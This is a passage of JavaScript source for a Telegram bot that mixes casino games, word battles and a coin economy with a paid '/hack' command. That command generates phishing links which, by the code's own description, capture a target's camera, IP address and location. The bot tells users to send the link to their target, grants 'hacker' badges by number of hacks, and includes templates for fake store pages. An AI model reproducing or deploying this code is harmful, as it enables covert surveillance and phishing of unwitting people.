        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*";
        const columns = canvas.width / 20;
        const drops = [];
        for(let i = 0; i < columns; i++) drops[i] = 1;
        function draw() {
            ctx.fillStyle = 'rgba(0,0,0,0.05)';
            ctx.fillRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = '#ff3366';
            ctx.font = '15px monospace';
            for(let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i*20, drops[i]*20);
                if(drops[i]*20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 50);
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
    </script>
</body>
</html>`,
  
  store: (data) => `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.store || 'Store'} | Premium Shop</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: #0a0a0a;
            color: #fff;
        }
        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 25px 50px;
            background: rgba(10,10,10,0.95);
            backdrop-filter: blur(10px);
            position: sticky;
            top: 0;
            z-index: 100;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .logo {
            font-size: 28px;
            font-weight: 800;
            background: linear-gradient(135deg, #ff6b6b, #ff8e53);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .cart-icon {
            position: relative;
            cursor: pointer;
            font-size: 24px;
        }
        .cart-count {
            position: absolute;
            top: -10px;
            right: -15px;
            background: #ff6b6b;
            color: white;
            border-radius: 50%;
            padding: 2px 8px;
            font-size: 12px;
        }
        .hero {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            text-align: center;
            padding: 100px 20px;
        }
        .hero h1 {
            font-size: 56px;
            margin-bottom: 20px;
        }
        .hero p {
            font-size: 20px;
            opacity: 0.9;
        }
        .products {
            max-width: 1200px;
            margin: 60px auto;
            padding: 0 20px;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
        }
        .product-card {
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            overflow: hidden;
            transition: 0.3s;
            cursor: pointer;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .product-card:hover {
            transform: translateY(-10px);
            border-color: #ff6b6b;
            box-shadow: 0 10px 30px rgba(255,107,107,0.2);
        }
        .product-image {
            height: 250px;
            background: linear-gradient(135deg, #ff6b6b, #ff8e53);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .product-image i { font-size: 80px; color: white; }
        .product-info { padding: 20px; }
        .product-title { font-size: 20px; font-weight: 700; margin-bottom: 10px; }
        .product-price { font-size: 28px; font-weight: 800; color: #ff6b6b; margin: 10px 0; }
        .add-to-cart {
            background: linear-gradient(135deg, #ff6b6b, #ff8e53);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            font-weight: 600;
            transition: 0.3s;
        }
        .add-to-cart:hover { opacity: 0.9; transform: scale(0.98); }
        footer {
            text-align: center;
            padding: 40px;
            border-top: 1px solid rgba(255,255,255,0.1);
            margin-top: 60px;
        }
        @media (max-width: 768px) {
            .hero h1 { font-size: 32px; }
            nav { flex-direction: column; gap: 20px; }
        }
    </style>
</head>
<body>
    <nav>
        <div class="logo"><i class="fas fa-store"></i> ${data.store || 'STORE'}</div>
        <div class="cart-icon">
            <i class="fas fa-shopping-cart"></i>
            <span class="cart-count">0</span>
        </div>
    </nav>
    
    <div class="hero">
        <h1>${data.store || 'Welcome to Our Store'}</h1>
        <p>${data.tagline || 'Premium products at unbeatable prices'}</p>
    </div>
    
    <div class="products">
        <div class="product-card">
            <div class="product-image"><i class="fas fa-laptop-code"></i></div>
            <div class="product-info">
                <div class="product-title">${data.product1 || 'Premium Product'}</div>
                <div class="product-price">$${data.product1_price || '49'}</div>
                <button class="add-to-cart" onclick="addToCart('${data.product1 || 'Product 1'}', ${data.product1_price || 49})">Add to Cart</button>
            </div>
        </div>
        <div class="product-card">
            <div class="product-image"><i class="fas fa-mobile-alt"></i></div>
            <div class="product-info">
                <div class="product-title">${data.product2 || 'Featured Item'}</div>
                <div class="product-price">$${data.product2_price || '79'}</div>
                <button class="add-to-cart" onclick="addToCart('${data.product2 || 'Product 2'}', ${data.product2_price || 79})">Add to Cart</button>
            </div>
        </div>
        <div class="product-card">
            <div class="product-image"><i class="fas fa-crown"></i></div>
            <div class="product-info">
                <div class="product-title">${data.product3 || 'Deluxe Edition'}</div>
                <div class="product-price">$${data.product3_price || '99'}</div>
                <button class="add-to-cart" onclick="addToCart('${data.product3 || 'Product 3'}', ${data.product3_price || 99})">Add to Cart</button>
            </div>
        </div>
    </div>
    
    <footer>
        <p>📧 ${data.email || 'store@example.com'}</p>
        <p style="margin-top: 10px;">© 2024 ${data.store || 'Store'} | All rights reserved</p>
    </footer>
    
    <script>
        let cart = [];
        function addToCart(name, price) {
            cart.push({name, price});
            document.querySelector('.cart-count').textContent = cart.length;
            alert(name + ' added to cart! Total items: ' + cart.length);
        }
    </script>
</body>
</html>`
};

// ========== MAIN MENU ==========
function getMainMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "💀 HACK", callback_data: "menu_hack" }, { text: "📝 WORD BATTLE", callback_data: "menu_word" }],
        [{ text: "🌐 CREATE WEBSITE", callback_data: "menu_web" }, { text: "🎰 CASINO", callback_data: "menu_casino" }],
        [{ text: "🎮 GAMES", callback_data: "menu_games" }, { text: "💰 ECONOMY", callback_data: "menu_eco" }],
        [{ text: "🏆 LEADERBOARD", callback_data: "menu_leaderboard" }, { text: "👤 PROFILE", callback_data: "menu_profile" }],
        [{ text: "🛒 SHOP", callback_data: "menu_shop" }, { text: "🎁 REDEEM", callback_data: "menu_redeem" }],
        [{ text: "🔗 REFERRAL", callback_data: "menu_ref" }, { text: "📢 CHANNEL", url: "https://t.me/devxtechzone" }],
        [{ text: "👑 ADMIN", callback_data: "menu_admin" }]
      ]
    }
  };
}

// ========== COMMANDS ==========

bot.start(async (ctx) => {
  // Check channel membership first
  let joined = await checkJoin(ctx);
  if (!joined && ctx.from.id !== OWNER_ID) {
    return ctx.reply(`🚫 **JOIN OUR CHANNEL FIRST!** 🚫\n\nClick below to join @devxtechzone then click /start again`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📢 JOIN CHANNEL", url: "https://t.me/devxtechzone" }],
          [{ text: "✅ I JOINED", callback_data: "check_join" }]
        ]
      }
    });
  }
  
  let ref = null;
  let args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) { ref = parseInt(args[1].replace("ref_", "")); }
  let user = await initUser(ctx.from.id, ref);
  
  await ctx.reply(
    `🟢⚡ **SLIME TRACKERX v40.1** ⚡🟢\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 💎 ${user.diamonds}\n📊 Level ${user.level} | 👥 ${user.referrals} referrals\n🏆 Word Wins: ${user.wordWins}\n\n⬇️ **CLICK BUTTONS BELOW** ⬇️`,
    { parse_mode: "Markdown", ...getMainMenu() }
  );
});

// Add the "I JOINED" button handler
bot.action("check_join", async (ctx) => {
  let joined = await checkJoin(ctx);
  if (joined) {
    await ctx.answerCbQuery("✅ Verified! You can use the bot now.");
    let user = await initUser(ctx.from.id);
    await ctx.reply(
      `✅ **THANKS FOR JOINING!** ✅\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 💎 ${user.diamonds}\n\n⬇️ **USE THE MENU BELOW** ⬇️`,
      { parse_mode: "Markdown", ...getMainMenu() }
    );
  } else {
    await ctx.answerCbQuery("❌ Still not joined!", true);
    await ctx.reply(`❌ **YOU HAVEN'T JOINED YET!** ❌\n\nPlease join @devxtechzone first, then click "I JOINED" again.`);
  }
});

// HACK command with 1-hour expiry
bot.command("hack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(`💀 **PHISHING LINK GENERATOR** 💀\n\nUsage: /hack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures Camera + IP + Location\n⏰ Link expires in 1 HOUR!\n\nExample: /hack free gift`);
  }
  
  let user = await initUser(ctx.from.id);
  if (user.coins < TRACK_COST) return ctx.reply(`❌ Need ${TRACK_COST} coins! You have ${user.coins}`);
  
  await takeCoin(ctx.from.id, TRACK_COST);
  user.hacks = (user.hacks || 0) + 1;
  await saveUser(ctx.from.id, user);
  
  let token = crypto.randomBytes(16).toString("hex");
  let label = args.slice(1).join(" ");
  let expiresAt = Date.now() + (60 * 60 * 1000); // 1 hour from now
  
  hackTokens.set(token, { 
    userId: ctx.from.id, 
    username: ctx.from.username || ctx.from.first_name, 
    label: label, 
    time: Date.now(),
    expiresAt: expiresAt
  });
  
  // Auto-delete after 1 hour
  setTimeout(() => {
    if (hackTokens.has(token)) {
      hackTokens.delete(token);
      console.log(`🗑️ Expired token deleted: ${token}`);
    }
  }, 60 * 60 * 1000);
  
  let hackLink = `${DOMAIN}/?token=${token}`;
  let expiryTime = new Date(expiresAt).toLocaleTimeString();
  
  await ctx.reply(
    `💀 **PHISHING LINK READY** 💀\n\n` +
    `🎯 Label: ${label}\n` +
    `💰 Cost: -${TRACK_COST} coins\n` +
    `💀 Total Hacks: ${user.hacks}\n` +
    `⏰ Expires at: ${expiryTime} (1 hour)\n\n` +
    `🔗 ${hackLink}\n\n` +
    `⚠️ **Send this link to your target!**\n` +
    `⚠️ **Link will stop working after 1 hour!**`,
    { parse_mode: "Markdown" }
  );
});

// Check your active links
bot.command("mylinks", async (ctx) => {
  let userTokens = [];
  let now = Date.now();
  
  for (let [token, data] of hackTokens) {
    if (data.userId === ctx.from.id) {
      let timeLeft = data.expiresAt - now;
      let minutesLeft = Math.floor(timeLeft / 60000);
      let secondsLeft = Math.floor((timeLeft % 60000) / 1000);
      let status = timeLeft > 0 ? `✅ Active (${minutesLeft}m ${secondsLeft}s left)` : '❌ Expired';
      userTokens.push(`🔗 ${token.substring(0, 8)}... - ${status} - ${data.label}`);
    }
  }
  
  if (userTokens.length === 0) {
    await ctx.reply(`📭 **No active links**\n\nCreate one with /hack [label]`);
  } else {
    await ctx.reply(`🔗 **YOUR ACTIVE LINKS**\n\n${userTokens.join('\n')}\n\n⚠️ Links expire in 1 hour!`);
  }
});

// WORD BATTLE
// ========== WORD BATTLE COMMAND ==========
bot.command("wordbattle", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 4) {
    return ctx.reply(
      `📝 **WORD BATTLE - 1v1 CHALLENGE** 📝\n\n` +
      `┌─────────────────────────────────┐\n` +
      `│  ⚔️ CHALLENGE A FRIEND! ⚔️     │\n` +
      `└─────────────────────────────────┘\n\n` +
      `📌 **Usage:**\n` +
      `/wordbattle @username amount difficulty\n\n` +
      `📝 **Example:**\n` +
      `/wordbattle @john 50 hard\n\n` +
      `⚡ **Difficulties:**\n` +
      `🍃 easy - 45 seconds, 3 letters (1x)\n` +
      `⚡ medium - 30 seconds, 5 letters (2x)\n` +
      `🔥 hard - 15 seconds, 7 letters (3x)\n` +
      `💀 expert - 8 seconds, 9 letters (5x)\n\n` +
      `💰 **Bet Range:** ${WORD_MIN_BET} - ${WORD_MAX_BET} coins\n` +
      `🏆 **Winner takes ALL coins!**\n\n` +
      `🎮 **How to play:**\n` +
      `1️⃣ Challenge someone with /wordbattle\n` +
      `2️⃣ They accept with /acceptword\n` +
      `3️⃣ You type a word with correct letters\n` +
      `4️⃣ Win = Double your bet + XP!\n\n` +
      `💡 **Example words:**\n` +
      `• easy (3): CAT, DOG, SUN, CAR\n` +
      `• medium (5): APPLE, MANGO, HOUSE\n` +
      `• hard (7): FREEDOM, JUSTICE\n` +
      `• expert (9): INCREDIBLE\n\n` +
      `Ready to battle? Challenge someone now! ⚔️`
    );
  }
  
  let targetUsername = args[1];
  let betAmount = parseInt(args[2]);
  let difficulty = args[3].toLowerCase();
  
  // Validate difficulty
  if (!difficulties[difficulty]) {
    return ctx.reply(
      `❌ **Invalid difficulty!**\n\n` +
      `Use: easy, medium, hard, or expert\n\n` +
      `🍃 easy - 3 letters, 45 seconds\n` +
      `⚡ medium - 5 letters, 30 seconds\n` +
      `🔥 hard - 7 letters, 15 seconds\n` +
      `💀 expert - 9 letters, 8 seconds`
    );
  }
  
  // Validate bet amount
  if (isNaN(betAmount) || betAmount < WORD_MIN_BET) {
    return ctx.reply(`❌ **Minimum bet is ${WORD_MIN_BET} coins!**\n\nExample: /wordbattle @user 50 easy`);
  }
  
  if (betAmount > WORD_MAX_BET) {
    return ctx.reply(`❌ **Maximum bet is ${WORD_MAX_BET} coins!**\n\nExample: /wordbattle @user 100 hard`);
  }
  
  // Find target user
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let c = await ctx.telegram.getChat(id);
      if (c.username === targetUsername.replace("@", "")) {
        targetId = id;
        break;
      }
    } catch(e) {}
  }
  
  if (!targetId) {
    return ctx.reply(`❌ **User @${targetUsername.replace("@", "")} not found!**\n\nMake sure the username is correct.`);
  }
  
  if (targetId === ctx.from.id) {
    return ctx.reply(`❌ **You cannot battle yourself!**\n\nChallenge someone else.`);
  }
  
  // Check if challenger has enough coins
  let user = await initUser(ctx.from.id);
  if (user.coins < betAmount) {
    return ctx.reply(`❌ **You need ${betAmount} coins!**\n\nYou have ${user.coins} coins.\n\nEarn more: /daily, /work, /dice, /slots`);
  }
  
  let diff = difficulties[difficulty];
  
  // Store challenge
  wordChallenges.set(targetId, { 
    from: ctx.from.id, 
    bet: betAmount, 
    difficulty, 
    letterCount: diff.letters, 
    status: "waiting",
    timer: diff.timer
  });
  
  // Auto-delete after 60 seconds
  setTimeout(() => { 
    if (wordChallenges.get(targetId)?.status === "waiting") {
      wordChallenges.delete(targetId);
    }
  }, 60000);
  
  // Send challenge to both users
  await ctx.reply(
    `✅ **CHALLENGE SENT!** ✅\n\n` +
    `┌─────────────────────────────────┐\n` +
    `│  🎯 Target: ${targetUsername}    │\n` +
    `│  💰 Bet: ${betAmount} coins      │\n` +
    `│  ⚡ Difficulty: ${diff.name}     │\n` +
    `│  📏 Need: ${diff.letters} letters│\n` +
    `│  ⏱️ Time: ${diff.timer} seconds  │\n` +
    `└─────────────────────────────────┘\n\n` +
    `⏳ Waiting for ${targetUsername} to accept...\n` +
    `⏰ Challenge expires in 60 seconds.`
  );
  
  await ctx.telegram.sendMessage(
    targetId, 
    `📝 **⚠️ WORD CHALLENGE! ⚠️** 📝\n\n` +
    `┌─────────────────────────────────┐\n` +
    `│  👤 Challenger: @${ctx.from.username} │\n` +
    `│  💰 Bet: ${betAmount} coins          │\n` +
    `│  ⚡ Difficulty: ${diff.name}         │\n` +
    `│  📏 Need: ${diff.letters} letters    │\n` +
    `│  ⏱️ Time: ${diff.timer} seconds      │\n` +
    `└─────────────────────────────────┘\n\n` +
    `💰 **Winner takes ${betAmount * 2} coins!**\n\n` +
    `✅ Type /acceptword to accept this challenge!\n` +
    `⏰ Challenge expires in 60 seconds.`
  );
});

// ========== ACCEPT WORD COMMAND ==========
bot.command("acceptword", async (ctx) => {
  let challenge = wordChallenges.get(ctx.from.id);
  
  if (!challenge) {
    return ctx.reply(
      `❌ **No challenge found!**\n\n` +
      `Ask someone to challenge you first:\n` +
      `/wordbattle @username amount difficulty`
    );
  }
  
  if (challenge.status !== "waiting") {
    return ctx.reply(`❌ **This challenge is already accepted or expired!**`);
  }
  
  // Check if accepter has enough coins
  let accepter = await initUser(ctx.from.id);
  if (accepter.coins < challenge.bet) {
    return ctx.reply(`❌ **You need ${challenge.bet} coins to accept!**\n\nYou have ${accepter.coins} coins.\n\nEarn more: /daily, /work, /dice, /slots`);
  }
  
  // Take coins from both players
  await takeCoin(challenge.from, challenge.bet);
  await takeCoin(ctx.from.id, challenge.bet);
  
  let diff = difficulties[challenge.difficulty];
  challenge.status = "active";
  challenge.currentTurn = "challenger";
  wordChallenges.set(ctx.from.id, challenge);
  
  // Notify challenger
  await ctx.telegram.sendMessage(
    challenge.from, 
    `📝 **🎯 YOUR TURN! 🎯** 📝\n\n` +
    `┌─────────────────────────────────┐\n` +
    `│  ⚡ Difficulty: ${diff.name}     │\n` +
    `│  📏 Need: ${challenge.letterCount} letters│\n` +
    `│  ⏱️ Time: ${diff.timer} seconds  │\n` +
    `│  💰 Pot: ${challenge.bet * 2} coins│\n` +
    `└─────────────────────────────────┘\n\n` +
    `✏️ **Type a ${challenge.letterCount}-letter word NOW!**\n\n` +
    `⚠️ You have ${diff.timer} seconds!`
  );
  
  // Set timer for response
  setTimeout(async () => {
    let game = wordChallenges.get(ctx.from.id);
    if (game && game.status === "active" && game.currentTurn === "challenger") {
      game.status = "completed";
      wordChallenges.delete(ctx.from.id);
      
      // Challenger timed out - opponent wins
      await addCoin(ctx.from.id, challenge.bet * 2);
      await addXP(ctx.from.id, 10);
      
      let winner = await initUser(ctx.from.id);
      winner.wordWins++;
      await saveUser(ctx.from.id, winner);
      
      await ctx.telegram.sendMessage(
        ctx.from.id, 
        `🎉 **YOU WIN BY DEFAULT!** 🎉\n\n` +
        `💰 Won ${challenge.bet * 2} coins! +10 XP\n\n` +
        `⏰ Opponent didn't answer in time!`
      );
      
      await ctx.telegram.sendMessage(
        challenge.from, 
        `💀 **YOU LOSE!** 💀\n\n` +
        `⏰ Time's up! You took too long.\n` +
        `💸 Lost ${challenge.bet} coins`
      );
    }
  }, diff.timer * 1000);
  
  await ctx.reply(
    `✅ **CHALLENGE ACCEPTED!** ✅\n\n` +
    `┌─────────────────────────────────┐\n` +
    `│  ⚔️ Battle Started! ⚔️          │\n` +
    `│  💰 Pot: ${challenge.bet * 2} coins│\n` +
    `│  ⏱️ Timer: ${diff.timer} seconds  │\n` +
    `└─────────────────────────────────┘\n\n` +
    `⏳ Waiting for @${(await getUsername(challenge.from))} to type a ${challenge.letterCount}-letter word...`
  );
});

// LEADERBOARD
bot.command("leaderboard", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => b.coins - a.coins).slice(0, 15);
  let message = "🏆 **TOP 15 COINS** 🏆\n\n";
  for (let i = 0; i < sorted.length; i++) {
    let name = await getUsername(sorted[i].userId);
    let medal = i === 0 ? "👑" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} ${i+1}. @${name} - ${sorted[i].coins} coins (Lvl ${sorted[i].level})\n`;
  }
  await ctx.reply(message);
});

// TOP WORDS
bot.command("topwords", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => b.wordWins - a.wordWins).slice(0, 10);
  let message = "📝 **TOP WORD BATTLE WINNERS** 📝\n\n";
  for (let i = 0; i < sorted.length; i++) {
    let name = await getUsername(sorted[i].userId);
    message += `${i+1}. @${name} - ${sorted[i].wordWins} wins\n`;
  }
  await ctx.reply(message);
});

// BALANCE
bot.command("balance", async (ctx) => { let u = await initUser(ctx.from.id); await ctx.reply(`💰 **BALANCE**\n\nCoins: ${u.coins}\n💎 Diamonds: ${u.diamonds}\n📊 Level: ${u.level}\n⭐ XP: ${u.xp}/${u.level * 100}`); });

// ========== DOPE PROFILE COMMAND ==========
bot.command("profile", async (ctx) => {
  let u = await initUser(ctx.from.id);
  
  // Calculate next level progress
  let currentLevelXP = u.xp;
  let neededXP = u.level * 100;
  let progressPercent = Math.floor((currentLevelXP / neededXP) * 100);
  let progressBar = "";
  for (let i = 0; i < 10; i++) {
    progressBar += i < progressPercent / 10 ? "█" : "░";
  }
  
  // Get user rank
  let sorted = Array.from(usersCache.values()).sort((a, b) => b.coins - a.coins);
  let rank = sorted.findIndex(user => user.userId === ctx.from.id) + 1;
  let rankEmoji = rank === 1 ? "👑" : rank === 2 ? "🥈" : rank === 3 ? "🥉" : "📌";
  
  // Get user badge
  let badge = "";
  if (u.hacks >= 100) badge = "💀 LEGENDARY HACKER 💀";
  else if (u.hacks >= 50) badge = "🔥 ELITE HACKER 🔥";
  else if (u.hacks >= 25) badge = "⚡ PRO HACKER ⚡";
  else if (u.hacks >= 10) badge = "💀 HACKER 💀";
  else if (u.wordWins >= 50) badge = "📝 WORD MASTER 📝";
  else if (u.wordWins >= 25) badge = "⚔️ BATTLE WARRIOR ⚔️";
  else if (u.level >= 10) badge = "🌟 VETERAN 🌟";
  else if (u.level >= 5) badge = "⭐ RISING STAR ⭐";
  else badge = "🎁 NEWBIE 🎁";
  
  // Get win rate
  let totalGames = u.wins + u.losses;
  let winRate = totalGames > 0 ? Math.floor((u.wins / totalGames) * 100) : 0;
  
  await ctx.reply(
    `┌─────────────────────────────────┐\n` +
    `│      👤 **PROFILE CARD** 👤      │\n` +
    `└─────────────────────────────────┘\n\n` +
    `🎯 **${ctx.from.first_name}** ${ctx.from.username ? `(@${ctx.from.username})` : ''}\n` +
    `┌─────────────────────────────────┐\n` +
    `│ 💰 **BALANCE**                   │\n` +
    `│    Coins: ${u.coins.toLocaleString()} 🪙\n` +
    `│    Diamonds: ${u.diamonds} 💎\n` +
    `├─────────────────────────────────┤\n` +
    `│ 📊 **PROGRESS**                  │\n` +
    `│    Level: ${u.level} 🎯\n` +
    `│    XP: ${currentLevelXP}/${neededXP}\n` +
    `│    [${progressBar}] ${progressPercent}%\n` +
    `├─────────────────────────────────┤\n` +
    `│ 🎮 **GAME STATS**                │\n` +
    `│    Wins: ${u.wins} 🏆 | Losses: ${u.losses} 💀\n` +
    `│    Win Rate: ${winRate}%\n` +
    `│    Word Wins: ${u.wordWins} 📝\n` +
    `├─────────────────────────────────┤\n` +
    `│ 💀 **HACKER STATS**              │\n` +
    `│    Total Hacks: ${u.hacks} 🔥\n` +
    `│    Referrals: ${u.referrals} 👥\n` +
    `│    Websites: ${u.websites.length} 🌐\n` +
    `├─────────────────────────────────┤\n` +
    `│ 🏆 **ACHIEVEMENTS**              │\n` +
    `│    Rank: ${rankEmoji} #${rank}\n` +
    `│    Badge: ${badge}\n` +
    `└─────────────────────────────────┘\n\n` +
    `⚡ **NEXT LEVEL:** ${neededXP - currentLevelXP} XP needed\n` +
    `💡 **TIP:** Play games and do /daily to level up!`,
    { parse_mode: "Markdown" }
  );
});

// DAILY
// ========== DOPE DAILY COMMAND ==========
bot.command("daily", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let now = Date.now(); 
  
  // Check if already claimed
  if (u.lastDaily && now - u.lastDaily < 86400000) { 
    let remaining = 86400000 - (now - u.lastDaily);
    let h = Math.floor(remaining / 3600000); 
    let m = Math.floor((remaining % 3600000) / 60000);
    let s = Math.floor((remaining % 60000) / 1000);
    
    // Progress bar for cooldown
    let progressPercent = Math.floor(((86400000 - remaining) / 86400000) * 100);
    let progressBar = "";
    for (let i = 0; i < 10; i++) {
      progressBar += i < progressPercent / 10 ? "█" : "░";
    }
    
    return ctx.reply(
      `┌─────────────────────────────────┐\n` +
      `│      ⏰ **DAILY COOLDOWN** ⏰     │\n` +
      `└─────────────────────────────────┘\n\n` +
      `🎁 **Next reward available in:**\n` +
      `⏰ ${h}h ${m}m ${s}s\n\n` +
      `📊 **Cooldown Progress:**\n` +
      `[${progressBar}] ${progressPercent}%\n\n` +
      `💡 **Tip:** Come back tomorrow for more coins!\n` +
      `🔥 **Current Streak:** ${u.streak}/7 days`
    ); 
  } 
  
  // Calculate reward with streak bonus
  let streakBonus = u.streak * 1;
  let reward = DAILY_REWARD + streakBonus;
  let oldStreak = u.streak;
  
  // Give reward
  await addCoin(ctx.from.id, reward);
  u.lastDaily = new Date(now);
  u.streak = (u.streak % 7) + 1;
  await saveUser(ctx.from.id, u);
  
  // Streak messages
  let streakMessage = "";
  let streakEmoji = "";
  if (u.streak === 1) {
    streakMessage = "🔥 You started a new streak!";
    streakEmoji = "🌱";
  } else if (u.streak === 7) {
    streakMessage = "🎉 MAX STREAK! You're on fire! 🔥";
    streakEmoji = "👑";
  } else if (u.streak >= 5) {
    streakMessage = "⚡ Almost at max streak! Keep going!";
    streakEmoji = "⚡";
  } else {
    streakMessage = "🎯 Keep logging in daily to increase streak!";
    streakEmoji = "🎯";
  }
  
  // Next reward preview
  let nextBonus = u.streak;
  let nextReward = DAILY_REWARD + nextBonus;
  
  await ctx.reply(
    `┌─────────────────────────────────┐\n` +
    `│      🎁 **DAILY REWARD** 🎁      │\n` +
    `└─────────────────────────────────┘\n\n` +
    `✨ **+${reward} COINS!** ✨\n\n` +
    `┌─────────────────────────────────┐\n` +
    `│ 🔥 **STREAK SYSTEM**            │\n` +
    `│    Day ${oldStreak} → Day ${u.streak}/7\n` +
    `│    ${streakEmoji} ${streakMessage}\n` +
    `├─────────────────────────────────┤\n` +
    `│ 📊 **REWARD BREAKDOWN**          │\n` +
    `│    Base Reward: ${DAILY_REWARD} coins\n` +
    `│    Streak Bonus: +${streakBonus} coins\n` +
    `│    Total: ${reward} coins\n` +
    `├─────────────────────────────────┤\n` +
    `│ 🎯 **NEXT REWARD**               │\n` +
    `│    Tomorrow's Reward: ${nextReward} coins\n` +
    `│    (${DAILY_REWARD} base + ${nextBonus} streak)\n` +
    `└─────────────────────────────────┘\n\n` +
    `💪 **Keep the streak alive! Come back tomorrow!**`
  );
});
// WORK
bot.command("work", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let now = Date.now(); 
  let last = workCD.get(u.userId) || 0; 
  if (now - last < 12 * 60 * 60 * 1000) { 
    let h = Math.floor((12 * 60 * 60 * 1000 - (now - last)) / 3600000); 
    return ctx.reply(`⏰ ${h}h left until you can work again!`); 
  } 
  let jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Tester", "📊 Analyst", "🔧 Engineer", "🚀 Marketer", "📈 Trader"]; 
  let job = jobs[Math.floor(Math.random() * jobs.length)]; 
  await addCoin(u.userId, WORK_REWARD);
  workCD.set(u.userId, now); 
  await ctx.reply(`💼 Worked as ${job}!\n+${WORK_REWARD} coins`); 
});

// REDEEM
bot.command("redeem", async (ctx) => { let args = ctx.message.text.split(" "); if (args.length < 2) return ctx.reply("❌ Usage: /redeem CODE"); let res = await redeemCode(ctx.from.id, args[1]); await ctx.reply(res.msg); });

// DICE
bot.command("dice", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let u = await initUser(ctx.from.id);
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /dice amount (min 1 coin)");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins`);
  
  await takeCoin(ctx.from.id, bet);
  let roll = Math.floor(Math.random() * 6) + 1;
  
  if (roll === 6) {
    let winAmount = bet * 3;
    await addCoin(ctx.from.id, winAmount);
    await addXP(ctx.from.id, 5);
    await ctx.replyWithDice();
    await ctx.reply(`🎲 Rolled ${roll}! 🎉 **JACKPOT!** +${winAmount} coins! +5 XP`);
  } else if (roll >= 4) {
    let winAmount = bet;
    await addCoin(ctx.from.id, winAmount);
    await addXP(ctx.from.id, 2);
    await ctx.replyWithDice();
    await ctx.reply(`🎲 Rolled ${roll}! 🎉 WIN +${winAmount} coins! +2 XP`);
  } else {
    await ctx.replyWithDice();
    await ctx.reply(`🎲 Rolled ${roll}! 💀 LOSE -${bet} coins`);
  }
});

// SLOTS
bot.command("slots", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let u = await initUser(ctx.from.id);
  if (isNaN(bet) || bet < 5) return ctx.reply("❌ Usage: /slots amount (min 5 coins)");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins`);
  
  await takeCoin(ctx.from.id, bet);
  let slots = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎", "7️⃣", "🎰"];
  let result = [slots[Math.floor(Math.random()*slots.length)], slots[Math.floor(Math.random()*slots.length)], slots[Math.floor(Math.random()*slots.length)]];
  
  if (result[0] === result[1] && result[1] === result[2]) {
    let winAmount = bet * 10;
    await addCoin(ctx.from.id, winAmount);
    await addXP(ctx.from.id, 20);
    await ctx.reply(`🎰 ${result.join(" ")} 🎰\n🎉 **MEGA JACKPOT!** +${winAmount} coins! +20 XP 🎉`);
  } else if (result[0] === result[1] || result[1] === result[2] || result[0] === result[2]) {
    let winAmount = bet * 2;
    await addCoin(ctx.from.id, winAmount);
    await addXP(ctx.from.id, 5);
    await ctx.reply(`🎰 ${result.join(" ")} 🎰\n🎉 WIN +${winAmount} coins! +5 XP`);
  } else {
    await ctx.reply(`🎰 ${result.join(" ")} 🎰\n💀 LOSE -${bet} coins`);
  }
});

// SHOP
bot.command("shop", async (ctx) => { await ctx.reply(`🛒 **SHOP** 🛒\n\n💎 100 Diamonds - 50 coins\n🎫 Lottery Ticket - 5 coins\n🎁 Mystery Box - 20 coins\n\nUse /buy [item]`); });

// BUY
bot.command("buy", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let item = args[1]?.toLowerCase();
  let u = await initUser(ctx.from.id);
  
  if (item === "diamonds") {
    if (u.coins < 50) return ctx.reply("❌ Need 50 coins!");
    await takeCoin(ctx.from.id, 50);
    u.diamonds += 100;
    await saveUser(ctx.from.id, u);
    await ctx.reply(`✅ +100 diamonds!`);
  } else if (item === "ticket") {
    if (u.coins < 5) return ctx.reply("❌ Need 5 coins!");
    await takeCoin(ctx.from.id, 5);
    await ctx.reply(`✅ Bought lottery ticket!`);
  } else if (item === "mystery") {
